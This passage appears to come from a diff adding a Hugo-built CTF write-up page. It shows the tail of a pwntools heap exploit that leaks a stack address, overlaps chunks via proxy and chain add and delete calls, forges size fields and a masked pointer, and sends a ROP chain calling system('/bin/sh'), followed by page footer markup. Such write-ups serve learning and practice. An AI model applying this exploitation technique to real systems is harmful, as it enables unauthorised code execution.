+</span></span><span style="display:flex;"><span>stack_leak <span style="color:#ff7b72;font-weight:bold">=</span> u64(p<span style="color:#ff7b72;font-weight:bold">.</span>recv(<span style="color:#a5d6ff">6</span>)<span style="color:#ff7b72;font-weight:bold">.</span>ljust(<span style="color:#a5d6ff">8</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\x00</span><span style="color:#a5d6ff">&#34;</span>))
+</span></span><span style="display:flex;"><span>rip <span style="color:#ff7b72;font-weight:bold">=</span> stack_leak <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">0x138</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#ff7b72;font-weight:bold">.</span>info(<span style="color:#a5d6ff">&#34;stack_leak: &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> hex(stack_leak))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">for</span> i <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">10</span>):
+</span></span><span style="display:flex;"><span>    add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;XXXX&#34;</span>, <span style="color:#a5d6ff">1234</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;DDDD&#34;</span>, <span style="color:#a5d6ff">1234</span>) <span style="color:#8b949e;font-style:italic"># 21</span>
+</span></span><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;EEEE&#34;</span>, <span style="color:#a5d6ff">1234</span>) <span style="color:#8b949e;font-style:italic"># 22</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add_chain(<span style="color:#a5d6ff">1</span>, [<span style="color:#a5d6ff">21</span>]) <span style="color:#8b949e;font-style:italic"># 3</span>
+</span></span><span style="display:flex;"><span>delete_chain(<span style="color:#a5d6ff">3</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add_chain(<span style="color:#a5d6ff">1</span>, [<span style="color:#a5d6ff">22</span>])
+</span></span><span style="display:flex;"><span>add_chain(<span style="color:#a5d6ff">1</span>, [<span style="color:#a5d6ff">22</span>]) <span style="color:#8b949e;font-style:italic"># 4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>delete_proxy(<span style="color:#a5d6ff">21</span>)
+</span></span><span style="display:flex;"><span>add_proxy(p64(overlap_ptr), <span style="color:#a5d6ff">0x0</span>) <span style="color:#8b949e;font-style:italic"># overwrite pointers</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;XXXX&#34;</span>, <span style="color:#a5d6ff">1234</span>)
+</span></span><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;X&#34;</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x50</span> <span style="color:#ff7b72;font-weight:bold">+</span> p64(<span style="color:#a5d6ff">0x0</span>) <span style="color:#ff7b72;font-weight:bold">+</span> p64(<span style="color:#a5d6ff">0x91</span>), <span style="color:#a5d6ff">1234</span>)
+</span></span><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;X&#34;</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x30</span> <span style="color:#ff7b72;font-weight:bold">+</span> p64(<span style="color:#a5d6ff">0x0</span>) <span style="color:#ff7b72;font-weight:bold">+</span> p64(<span style="color:#a5d6ff">0x51</span>), <span style="color:#a5d6ff">1234</span>)
+</span></span><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;XXXX&#34;</span>, <span style="color:#a5d6ff">1234</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>delete_proxy(<span style="color:#a5d6ff">26</span>)
+</span></span><span style="display:flex;"><span>delete_proxy(<span style="color:#a5d6ff">25</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>delete_chain(<span style="color:#a5d6ff">4</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;A&#34;</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x70</span>, <span style="color:#a5d6ff">1234</span>)
+</span></span><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;A&#34;</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x50</span> <span style="color:#ff7b72;font-weight:bold">+</span> p64(mask(mask_ptr, rip)), <span style="color:#a5d6ff">1234</span>)
+</span></span><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;A&#34;</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x70</span>, <span style="color:#a5d6ff">1234</span>)
+</span></span><span style="display:flex;"><span>add_proxy(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;A&#34;</span><span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">0x8</span> <span style="color:#ff7b72;font-weight:bold">+</span> p64(ret) <span style="color:#ff7b72;font-weight:bold">+</span> p64(pop_rdi) <span style="color:#ff7b72;font-weight:bold">+</span> p64(binsh) <span style="color:#ff7b72;font-weight:bold">+</span> p64(system), <span style="color:#a5d6ff">1234</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;6&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>interactive()
+</span></span></code></pre></div>
+      </div>
+
+
+      <footer>
+        
+
+
+        <div id="disqus_thread"></div>
+<script>
+  window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+    
+    document.addEventListener('themeChanged', function (e) { 
+        if (document.readyState == 'complete') {
+          DISQUS.reset({ reload: true, config: disqus_config });
+        }
+    });
+</script>
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2026
+     bitfriends 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
